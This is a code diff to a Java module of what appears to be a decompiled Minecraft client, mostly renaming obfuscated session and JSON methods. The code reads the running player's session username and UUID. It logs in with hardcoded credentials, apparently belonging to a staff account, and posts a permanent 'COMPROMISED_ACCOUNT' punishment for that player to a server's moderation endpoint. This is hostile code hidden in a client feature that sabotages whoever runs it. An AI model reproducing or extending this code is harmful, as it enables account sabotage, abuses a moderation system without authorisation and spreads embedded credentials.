@@ -21,6 +21,8 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.BasicCookieStore;
 import org.apache.http.impl.client.HttpClientBuilder;
 import org.apache.http.message.BasicNameValuePair;
+import totalcross.json.JSONArray;
+import totalcross.json.JSONObject;
 
 @InDevelopment
 public class Class5382 extends Module {
@@ -38,17 +40,17 @@ public class Class5382 extends Module {
    public void isInDevelopment() {
       try {
          String var3 = "D8374378";
-         String var4 = mc.field1293.method21526();
-         String var5 = mc.field1293.method21525().replaceAll("-", "");
+         String var4 = mc.session.getUsername();
+         String var5 = mc.session.getPlayerID().replaceAll("-", "");
          if (this.method16956() && this.method16961("CREEPAKILLER987@S0NY.IGG.BIZ", "3Qs-Cnt-Dec-Tee")) {
             this.method16959();
             JSONObject var6 = this.method16958(var3, var5);
             System.out.println(var6);
-            var6.method21806("duration", "Permanent");
-            var6.method21806("subType", "COMPROMISED_ACCOUNT");
-            var6.method21806("reason", "Account Security Alert");
-            var6.method21806("tags", new Class2344().method9158("FI"));
-            var6.method21806("type", "0");
+            var6.put("duration", "Permanent");
+            var6.put("subType", "COMPROMISED_ACCOUNT");
+            var6.put("reason", "Account Security Alert");
+            var6.put("tags", new JSONArray().put("FI"));
+            var6.put("type", "0");
             if (this.method16957(var6, var4.toLowerCase())) {
                this.method16959();
             }
@@ -100,7 +102,7 @@ public class Class5382 extends Module {
                   var6.add(new BasicNameValuePair("punishment[" + var8 + "]", String.valueOf(var1.method21770(var8))));
                }
             } else {
-               var6.add(new BasicNameValuePair("punishment[" + var8 + "][]", var1.method21768(var8).method9131(0)));
+               var6.add(new BasicNameValuePair("punishment[" + var8 + "][]", var1.getJSONArray(var8).getString(0)));
             }
          }
 
